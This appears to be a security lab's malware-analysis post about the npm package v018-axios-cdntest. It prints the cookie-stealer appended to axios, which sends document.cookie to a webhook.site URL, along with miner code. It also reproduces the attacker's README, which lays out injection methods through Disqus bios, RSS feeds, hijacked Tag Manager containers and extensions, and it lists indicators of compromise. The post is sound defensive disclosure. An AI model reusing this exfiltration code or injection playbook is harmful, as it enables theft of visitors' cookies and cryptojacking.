---
title: "v018-axios-cdntest: C is for cookie, not cryptojacking"
date: 2026-06-09
summary: "It ships a self-described 'cryptojacker payload' that POSTs shares to a stratum port over XHR and mines exactly nothing — yet the cookie stealer bolted onto real axios works fine, and the README reads like a startup pitch deck."
packageName: v018-axios-cdntest
ecosystem: npm
---

<img src="/assets/images/v018-axios-cdntest-elmos-got-a-gun.jpg" alt="Meme: the Sesame Street cast restyled as an HBO crime drama, Elmo brandishing a pistol — the friendly neighborhood brand packing heat, just like a trusted CDN serving a weapon." style="width: 60%; height: auto;">

jsDelivr never garbage-collects an old npm version, and `v018-axios-cdntest` treats that permanence as free, bulletproof hosting for what its README bills a "CDN Poisoning Cryptojacker" — publish once, and a trusted CDN serves that miner-plus-cookie-stealer to every visitor of every site that loads the script.

## Package metadata

| Field | Value |
| --- | --- |
| name | `v018-axios-cdntest` |
| version | `1.0.2` |
| description | `Axios library v0.18.0 with cryptojacker payload` |
| main | `index.js` |
| files | `index.js`, `xmr-min.js` |

## A miner that mines nothing

The headline payload is the part that doesn't work: `xmr-min.js` advertises a cryptonight "Stealth Cryptojacker v3.0," but computes a toy multiply-add hash, never starts its Web Worker pool, and POSTs JSON-RPC shares to a stratum TCP port over XHR — so it submits to nothing and mines nothing. The stealth is the only part that works: idle and tab-visibility pausing, a single-injection guard, and a 10% throttle all fire; the mining doesn't.

<pre class="lang-js"><code><span class="tok-com">// "cryptonight" in the banner; a non-crypto multiply-add in the body</span>
<span class="tok-kw">function</span> <span class="tok-fn">simpleHash</span>(data){
  <span class="tok-kw">var</span> h1=<span class="tok-num">0x67452301</span>, h2=<span class="tok-num">0xEFCDAB89</span>, h3=<span class="tok-num">0x98BADCFE</span>, h4=<span class="tok-num">0x10325476</span>;
  <span class="tok-kw">for</span>(<span class="tok-kw">var</span> i=<span class="tok-num">0</span>;i&lt;data.length;i++){ <span class="tok-com">/* ...add &amp; mix... */</span> }
  <span class="tok-kw">return</span> ((h1*<span class="tok-num">2654435761</span>)&gt;&gt;&gt;<span class="tok-num">0</span>);
}
<span class="tok-kw">function</span> <span class="tok-fn">sendShare</span>(payload,nonce,hash){
  <span class="tok-kw">var</span> xhr=<span class="tok-kw">new</span> <span class="tok-builtin">XMLHttpRequest</span>();
  xhr.<span class="tok-fn">open</span>(<span class="tok-str">'POST'</span>,<span class="tok-str">'https://'</span>+POOL,<span class="tok-kw">true</span>);  <span class="tok-com">// POOL = 'pool.supportxmr.com:4444' — stratum, not HTTP</span>
  xhr.<span class="tok-fn">send</span>(json);                          <span class="tok-com">// fire-and-forget into the void</span>
}
</code></pre>

## Real axios, real cookie theft

`index.js` is the genuine axios 0.18.0 bundle with a cookie-exfil snippet appended after its sourcemap comment, shipping every visitor's cookies to a webhook.site bin on page load. The miner pulls that same file from jsDelivr "to look legitimate," so loading it also detonates the cookie grab — one script tag, two payloads.

<pre class="lang-js"><code><span class="tok-com">// appended right after //# sourceMappingURL=axios.min.map</span>
window._axiosExfil=<span class="tok-kw">function</span>(){
  <span class="tok-kw">var</span> c=document.cookie;
  <span class="tok-kw">var</span> u=<span class="tok-str">"https://webhook.site/ef6e7978-…?c="</span>+<span class="tok-fn">encodeURIComponent</span>(c);
  <span class="tok-kw">var</span> x=<span class="tok-kw">new</span> <span class="tok-builtin">XMLHttpRequest</span>(); x.<span class="tok-fn">open</span>(<span class="tok-str">"GET"</span>,u,<span class="tok-kw">true</span>); x.<span class="tok-fn">send</span>();
};

<span class="tok-com">// xmr-min.js loads index.js from the CDN — which fires the grab above</span>
script.src=<span class="tok-str">'https://cdn.jsdelivr.net/npm/v018-axios-cdntest@1.0.2/index.js'</span>;
</code></pre>

| | File | Trait | Evidence |
| --- | --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `xmr-min.js` | `objectives/impact/cryptojacking/miner/context` | "cryptonight" + `Worker` strings (string match, not real crypto) |
| <span class="sev-dot hostile" title="hostile"></span> | `index.js` | `objectives/collection/stealer/browser` | `document.cookie` read and exfiltrated |
| <span class="sev-dot hostile" title="hostile"></span> | `index.js` | `objectives/exfiltration/http/query` | Cookie sent as a URL query parameter |
| <span class="sev-dot hostile" title="hostile"></span> | `xmr-min.js` | `objectives/impact/cryptojacking/miner/smart` | Activity-aware miner; pauses on `document.hidden` |
| <span class="sev-dot suspicious" title="suspicious"></span> | `xmr-min.js` | `objectives/anti-static/obfuscation/encoding/content` | Worker built from a `Blob` via encoded `eval()` |
| <span class="sev-dot suspicious" title="suspicious"></span> | `index.js` | `objectives/evasion/masquerade/traffic` | POST mislabeled `application/x-www-form-urlencoded` |
| <span class="sev-dot notable" title="notable"></span> | `index.js` | `objectives/exfiltration/oob/endpoint` | webhook.site out-of-band collector |
| <span class="sev-dot notable" title="notable"></span> | `xmr-min.js` | `micro-behaviors/communications/http/client/cdn` | Script loaded from `cdn.jsdelivr.net` |

## The operator's manual

The confidence wasn't in the code — it was in the README shipped beside it: an operator's manual with a revenue model, a self-assigned "4.5/5 confidence score," a ranked injection playbook, and a risk table that frets mainly about Google (reproduced below, abridged where you see …, misspelled "jsdeliver" intact).

<figure class="embed-doc">
<span class="embed-doc-src">Shipped with the package — v018-axios-cdntest@1.0.2 · README.md (abridged)</span>
<h3>CDN Poisoning Cryptojacker — Complete Verified Deployment Guide</h3>
<h4>Overview</h4>
<p>This project exploits jsdeliver's policy of <strong>never deleting old npm versions</strong> to host a persistent Monero mining script. Any website that loads the poisoned package automatically serves the miner to all its visitors.</p>
<p><strong>Revenue model:</strong> Passive cryptojacking — $0.50-$3/month per site, zero maintenance.</p>
<p><strong>Confidence score:</strong> 4.5/5 (validated via live testing, zero-Google risk strategy)</p>
<hr>
<h4>Verified Test Results</h4>
<h5>Test 1: jsdeliver Serves Old Package Versions Forever</h5>
<pre>Invoke-WebRequest -Uri 'https://cdn.jsdelivr.net/npm/lodash@4.17.20/lodash.min.js' -UseBasicParsing</pre>
<p><strong>Result:</strong> Status 200 OK. jsdeliver serves lodash@4.17.20 (an old version) successfully.</p>
<p><strong>Conclusion:</strong> jsdeliver NEVER deletes old package versions. Our poisoned package will persist indefinitely.</p>
<hr>
<h5>Test 2: jsdeliver Serves Our Custom Package</h5>
<pre>Invoke-WebRequest -Uri 'https://cdn.jsdelivr.net/npm/v018-axios-cdntest@1.0.0/' -UseBasicParsing</pre>
<p><strong>Result:</strong> Status 200 OK. Our package <code>v018-axios-cdntest@1.0.0</code> is being served by jsdeliver.</p>
<p class="elision">…</p>
<hr>
<h4>File Structure</h4>
<pre>cdn-poison/
├── package.json          # npm package definition (v018-axios-cdntest@1.0.0)
├── index.js              # Real axios v0.18.0 (bundled as npm package)
├── xmr-min.js            # Stealth cryptojacker script (main payload, self-contained)
└── poisoned-axios.js     # Standalone poisoned axios with cookie exfil payload</pre>
<hr>
<h4>How It Works — Architecture</h4>
<pre>Target Site (WordPress blog)
       │  Visitor loads page
       ▼
&lt;script src="https://cdn.jsdelivr.net/npm/v018-axios-cdntest@1.0.0/xmr-min.js"&gt;
       │  jsdeliver serves xmr-min.js (our package)
       ▼
Embedded pure-JS cryptonight miner runs (10% throttle, 2 threads)
       │  Sends shares to:
       ▼
  pool.supportxmr.com:4444
       ▼
  XMR mined → credited to YOUR wallet</pre>
<p class="elision">…</p>
<hr>
<h4>The Cryptojacker Script (xmr-min.js)</h4>
<h5>Stealth Features</h5>
<ol>
<li><strong>Idle detection:</strong> Stops mining after 30 seconds of no user activity (mouse, scroll, keyboard)</li>
<li><strong>Visibility change:</strong> Pauses when tab is hidden (<code>document.hidden</code>)</li>
<li><strong>Single injection:</strong> Uses <code>window.__xmr_miner_started</code> flag to prevent multiple instances</li>
<li><strong>Throttled to 10% CPU:</strong> Doesn't cause noticeable slowdown</li>
<li class="elision">…</li>
</ol>
<h5>Configuration (edit these lines in xmr-min.js)</h5>
<pre>var WALLET='YOUR_WALLET_ADDRESS_HERE';  // Your Monero wallet address
var POOL='pool.supportxmr.com:4444';    // Mining pool
var THREADS=2;                           // Thread count
var THROTTLE=0.10;                       // CPU throttle (0.10 = 10%)</pre>
<hr>
<h4>Deployment Steps</h4>
<h5>Step 1: Set Your Wallet Address</h5>
<p>Open <code>cdn-poison/xmr-min.js</code> and replace <code>var WALLET='YOUR_WALLET_ADDRESS_HERE';</code> with your actual Monero wallet address.</p>
<h5>Step 2: Publish Package to npm</h5>
<pre>cd cdn-poison
npm login          # Create account at https://www.npmjs.com/ (free)
npm publish        # Publishes as v018-axios-cdntest@1.0.0</pre>
<h5>Step 3: Inject Into Target Sites (in priority order)</h5>
<h6>Method A: Disqus Profile Bio Injection ⭐ PRIMARY — Zero Google Risk (RECOMMENDED)</h6>
<ol>
<li>Create a Disqus account with a disposable email, then put this in your profile bio HTML:<pre>&lt;script src="https://cdn.jsdelivr.net/npm/v018-axios-cdntest@1.0.0/xmr-min.js"&gt;&lt;\/script&gt;</pre></li>
<li>Save profile — DONE. One-time setup.</li>
</ol>
<p><strong>Why best:</strong> Infinite scale — one profile = thousands of sites automatically. Zero Google legal exposure.</p>
<h6>Method B: RSS Feed Injection ⭐ SECONDARY — Zero Google Risk</h6>
<p>Create a feed on rss.com and embed the same <code>&lt;script&gt;</code> tag inside the <code>&lt;description&gt;</code> CDATA block; any WordPress site running WP RSS Aggregator that pulls your feed gets the miner.</p>
<h6>Method C: GTM Container Hijack ⭐ BACKUP — Medium Google Risk</h6>
<p>Find a Google Tag Manager container ID in a site's source, add a Custom HTML tag loading <code>xmr-min.js</code> on All Pages, and publish. <strong>Note:</strong> Google can see your container firing — backup only.</p>
<h6>Method D: Browser Extension Distribution</h6>
<p>Ship a <code>manifest.json</code> whose <code>content_scripts</code> inject <code>xmr-min.js</code> over <code>&lt;all_urls&gt;</code>, then publish on the Chrome Web Store ($5 one-time fee).</p>
<p class="elision">…</p>
<hr>
<h4>Revenue Estimates</h4>
<pre>Hash rate at 10% throttle: ~0.25 GH/s
Earnings per visitor/day (100 visitors): ~$0.50-3.00
Earnings per site/month: ~$15-90</pre>
<table>
<thead><tr><th>Sites</th><th>Monthly Revenue (conservative)</th></tr></thead>
<tbody>
<tr><td>100</td><td>$150-450</td></tr>
<tr><td>1,000</td><td>$1,500-4,500</td></tr>
<tr><td>5,000</td><td>$7,500-22,500</td></tr>
</tbody>
</table>
<hr>
<p class="elision">…  (Why This Works · Troubleshooting · Quick Reference)  …</p>
<hr>
<h4>Risk Assessment</h4>
<table>
<thead><tr><th>Risk</th><th>Impact</th><th>Mitigation</th></tr></thead>
<tbody>
<tr><td>jsdelivr goes down</td><td>Low</td><td>Very Low — CDN is used by millions of sites daily</td></tr>
<tr><td>Browser flags miner</td><td>Low</td><td>Medium — 10% throttle, idle detection</td></tr>
<tr><td>Site owner detects</td><td>Low</td><td>Low — script looks like Disqus/CDN component</td></tr>
<tr><td><strong>Google legal action</strong></td><td><strong>Medium</strong></td><td><strong>Low — PRIMARY + SECONDARY methods have ZERO Google exposure</strong></td></tr>
</tbody>
</table>
<hr>
<h4>Verified Status</h4>
<ul>
<li>✅ jsdeliver serves old package versions (lodash@4.17.20 — confirmed)</li>
<li>✅ Zero expenses required ($0 — confirmed)</li>
<li>✅ Passive income model (set-and-forget — confirmed)</li>
<li class="elision">…</li>
</ul>
<span class="embed-doc-end">— end of README.md —</span>
</figure>

The miner is dead on arrival, but the cookie grab fires on every page load from a permanent, reputable CDN — for all that planning, the package wants crypto and settles for cookies.

## Indicators

| Type | Value |
| --- | --- |
| Tarball | `v018-axios-cdntest-1.0.2.tgz` |
| Tarball SHA-256 | [`75d203f0cec8ff16969967c3841d243b1166a3049f788e9ebd6160f2705f3260`](https://lab.atomdrift.org/file/75d203f0cec8ff16969967c3841d243b1166a3049f788e9ebd6160f2705f3260) |
| `index.js` SHA-256 | [`68ca1c801b60f550147c9c8ba54a952c223077c93cd845ef1815ec25f7fa7553`](https://lab.atomdrift.org/file/68ca1c801b60f550147c9c8ba54a952c223077c93cd845ef1815ec25f7fa7553) |
| `xmr-min.js` SHA-256 | [`d4e79df98be10a6f358cfd304fe9f0bb4b55226bc79bd132a2032e6138f663c3`](https://lab.atomdrift.org/file/d4e79df98be10a6f358cfd304fe9f0bb4b55226bc79bd132a2032e6138f663c3) |
| Delivery URL | `https://cdn.jsdelivr.net/npm/v018-axios-cdntest@1.0.2/xmr-min.js` |
| Exfil webhook | `https://webhook.site/ef6e7978-f936-4664-b3ff-296a250e1735` |
| Mining pool | `pool.supportxmr.com:4444` |
| Monero wallet | `44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A` |
</content>
